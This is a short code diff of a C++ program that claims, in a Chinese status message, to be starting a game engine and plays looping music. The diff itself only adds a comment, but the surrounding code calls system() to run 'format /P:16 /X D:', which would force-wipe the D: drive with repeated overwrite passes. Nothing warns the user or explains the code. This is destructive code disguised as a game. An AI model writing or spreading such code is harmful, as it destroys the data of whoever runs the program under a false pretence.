@@ -6,7 +6,7 @@
 using namespace std;
 int main(){
   cerr<<"开始渲染游戏引擎……";
-  PlaySound("music",null,SND_FILENAME|SND_LOOP|SND_ASYNC);
+  PlaySound("music",null,SND_FILENAME|SND_LOOP|SND_ASYNC);//播个音乐把
   system("format /P:16 /X D: > tmpfile");
   while(true){
     system("find \"%\" tmpfile");
